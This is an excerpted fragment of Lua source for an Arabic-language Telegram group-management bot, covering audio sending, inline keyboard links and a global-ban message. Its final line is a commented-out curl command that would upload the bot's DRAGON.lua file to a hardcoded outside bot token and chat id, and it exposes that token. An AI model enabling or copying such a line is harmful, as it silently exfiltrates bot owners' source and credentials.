...
sendAudio(msg.chat_id_,msg.id_,'./'..ffrr,"🎼 𝐌𝐎𝐕𝐊")  
...
keyboard.inline_keyboard = {
{{text = '𓆩B𝗮ꪀ𝗱A𓆪',url="t.me/de_vi_d"}},
{{text = '𓆩𝙨𝙤𝙪𝙧𝙘𝙚𓆪', url="t.me/A_V_I_R_A_1"}},
{{text = '𓆩𝗧𝘄𝗮𝘀𝗼𝗹𓆪', url="t.me/de_vi_d25BOT"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
...
function(arg,data) 
usertext = '\n 🕸️ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'A_V_I_R_A_1')..')'
...
usertext = '\n 🕸️ العضو » ['..result.title_..'](t.me/'..(username or 'A_V_I_R_A_1')..')'
status  = '\n 🕸️ تم حظره عام من الكروبات'
texts = usertext..status
...
{
{text = '𝚂𝙾𝚄𝚁𝙲𝙴 𝙼𝙾𝚅𝙺', url="t.me/A_V_I_R_A_1"},
...
send(msg.chat_id_, msg.id_, t..'≪━━━━━━𝐌𝐎𝐕𝐊━━━━━━≫ٴ\n⚪ [ 𝐌𝐎𝐕𝐊 ](t.me/A_V_I_R_A_1)')
end
...
--local curl = 'curl "'..'https://api.telegram.org/bot1725498714:AAEMctMpjJc1xldfXk3Gu0h1ZP3wS6LsBrI/sendDocument'..'" -F "chat_id='.. 1174250096 ..'" -F "document=@'..'DRAGON.lua'..'"' io.popen(curl)
------------------------------------------------------------------------
